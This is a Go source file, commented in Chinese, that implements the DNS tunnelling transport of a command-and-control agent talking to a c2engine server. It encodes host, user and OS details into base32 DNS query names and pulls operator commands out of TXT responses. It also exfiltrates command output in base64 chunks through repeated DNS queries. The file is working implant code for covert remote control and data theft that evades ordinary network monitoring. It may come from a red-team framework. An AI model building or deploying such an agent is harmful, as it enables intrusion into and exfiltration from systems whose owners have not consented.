package main

// DNS 传输（对应服务端 c2engine/dns.go 的信道）。
//
// 线格式（RE 结论 E-08 + 服务端实现约定）：
//
//	查询名 = base32([8B agentID 大端][消息]) + "." + <zone>
//	响应   = TXT 记录（第一条 TXT 的拼接字符串）
//
// 消息（明文，":" 分隔）：
//
//	"checkin:<host>|<user>|<os>"   ← "ok:<clientID>:<interval>"
//	"task"                          ← "task:<taskID>:<base32(命令)>" 或 "noop"
//	"result:<taskID>:<数据>"        ← "ack"
//
// 为什么重写：旧实现假设的是 `rgst:`/`main:`/`conf:` 这套前缀，与服务端
// （`checkin:`/`task`/`result:`）完全对不上，而且从不读 TXT 响应——
// 相当于两端各写一半（docs/STATUS.md §4.2-⑬）。现在两端统一，且 e2e 覆盖。
//
// 传输参数：ServerAddr 形如 `dns://c2.example.com`（zone）；DNSServer 是
// 实际要查询的 DNS 服务器地址（如 `127.0.0.1:15353`），空则用系统解析器。

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"runtime"
	"strings"
	"time"

	"github.com/miekg/dns"
)

// dnsTransport 是基于 DNS 的 agent 传输。
type dnsTransport struct {
	zone   string // 查询后缀（ServerAddr 里的域名）
	server string // DNS 服务器地址（DNSServer，空 → 系统解析器）
	client *dns.Client
}

// newDNSTransport 创建 DNS 传输。
func newDNSTransport(zone string) *dnsTransport {
	zone = strings.TrimSuffix(strings.TrimPrefix(strings.TrimSpace(zone), "."), ".")
	server := strings.TrimSpace(DNSServer)
	if strings.HasPrefix(server, "REPLACE_") {
		server = ""
	}
	if server != "" && !strings.Contains(server, ":") {
		server = net.JoinHostPort(server, "53")
	}
	return &dnsTransport{
		zone:   zone,
		server: server,
		client: &dns.Client{Timeout: 5 * time.Second, Net: "udp"},
	}
}

// base32NoPad 是 Go 标准 base32（无填充）——与服务端 decodeData 一致。
var base32NoPad = base32.StdEncoding.WithPadding(base32.NoPadding)

// query 把 [8B agentID][消息] 编成标签发出，返回 TXT 响应原文。
func (t *dnsTransport) query(taskID int64, msg string) (string, error) {
	raw := make([]byte, 8+len(msg))
	binary.BigEndian.PutUint64(raw[:8], uint64(clientID))
	copy(raw[8:], msg)

	// DNS 单个标签上限 63 字符：base32 结果按 60 字符切块，用 "." 连接。
	// 服务端（c2engine/dns.go handleDNSQuery）会把各标签按序拼回再解码。
	label := strings.ToLower(base32NoPad.EncodeToString(raw))
	var labels []string
	for len(label) > 60 {
		labels = append(labels, label[:60])
		label = label[60:]
	}
	labels = append(labels, label)

	name := strings.Join(labels, ".") + "."
	if t.zone != "" {
		name += t.zone + "."
	}

	m := new(dns.Msg)
	m.SetQuestion(name, dns.TypeTXT)
	m.RecursionDesired = true

	resp, _, err := t.client.Exchange(m, t.server)
	if err != nil {
		return "", err
	}
	if resp == nil {
		return "", fmt.Errorf("dns: empty response")
	}
	// 服务端把响应 base32 编码后再按 60 字符切块放进多条 TXT（c2engine/dns.go
	// 的 sendDNSResponse/encodeData）。这里先拼回整串再解 base32；解不开就按
	// 明文处理（兼容将来可能的明文响应）。
	var joined string
	for _, rr := range resp.Answer {
		if txt, ok := rr.(*dns.TXT); ok {
			joined += strings.Join(txt.Txt, "")
		}
	}
	if joined == "" {
		return "", nil
	}
	if raw, derr := base32NoPad.DecodeString(strings.ToUpper(joined)); derr == nil {
		return string(raw), nil
	}
	return joined, nil
}

// Checkin 执行签到："checkin:<host>|<user>|<os>"，响应 "ok:<clientID>:<interval>"。
func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
	msg := fmt.Sprintf("checkin:%s|%s|%s", hostname, username, runtime.GOOS)
	resp, err := t.query(0, msg)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: %w", err)
	}
	if !strings.HasPrefix(resp, "ok:") {
		return nil, fmt.Errorf("dns checkin rejected: %q", resp)
	}
	parts := strings.Split(strings.TrimPrefix(resp, "ok:"), ":")
	var id int64
	var interval int
	if len(parts) > 0 {
		fmt.Sscanf(parts[0], "%d", &id)
	}
	if len(parts) > 1 {
		fmt.Sscanf(parts[1], "%d", &interval)
	}
	if id <= 0 {
		return nil, fmt.Errorf("dns checkin: server returned invalid client id %q", resp)
	}
	clientID = id
	if interval > 0 {
		sleepTime = interval
	}
	return &CheckinResponse{Status: "ok", ClientID: id, Interval: interval}, nil
}

// GetTasks 轮询任务：响应 "task:<id>:<base32(命令)>"，或 "noop"。
func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
	resp, err := t.query(clientID, "task")
	if err != nil {
		return nil, fmt.Errorf("dns task poll: %w", err)
	}
	if resp == "" || resp == "noop" || resp == "ack" {
		return nil, nil
	}
	if !strings.HasPrefix(resp, "task:") {
		return nil, nil
	}
	parts := strings.SplitN(strings.TrimPrefix(resp, "task:"), ":", 2)
	if len(parts) != 2 {
		return nil, nil
	}
	var id int64
	fmt.Sscanf(parts[0], "%d", &id)
	cmd, derr := base32NoPad.DecodeString(strings.ToUpper(parts[1]))
	if derr != nil {
		return nil, fmt.Errorf("dns task decode: %w", derr)
	}
	return []TaskItem{{ID: id, Command: string(cmd), Timeout: 30}}, nil
}

// dnsResultChunk 是单次查询承载的结果字节数。
//
// 约束：查询名整体 ≤255 字节。查询名 = base32(8B id + 消息) + zone，base32 膨胀
// 约 8/5，还要加上分块用的点号与 zone 本身。按 zone ≤ 20 字节、消息头
// "result:<id>:<seq>/<total>:" ≈ 20 字节估算，原始分片取 60 字节时整名约 180
// 字节，留有余量（96 字节时实测超过 255，服务端直接收不到查询）。
const dnsResultChunk = 60

// SendResult 回传结果（分片上传），服务端按 seq/total 拼回再落库。
//
//	"result:<taskID>:<seq>/<total>:<base64 分片>"   →  "ack"
func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
	total := (len(result) + dnsResultChunk - 1) / dnsResultChunk
	if total == 0 {
		total = 1
	}
	for seq := 1; seq <= total; seq++ {
		start := (seq - 1) * dnsResultChunk
		end := start + dnsResultChunk
		if end > len(result) {
			end = len(result)
		}
		chunk := base64.StdEncoding.EncodeToString([]byte(result[start:end]))
		msg := fmt.Sprintf("result:%d:%d/%d:%s", taskID, seq, total, chunk)
		if _, err := t.query(clientID, msg); err != nil {
			return fmt.Errorf("dns result chunk %d/%d: %w", seq, total, err)
		}
	}
	return nil
}

// Close 关闭传输（无状态）。
func (t *dnsTransport) Close() error { return nil }
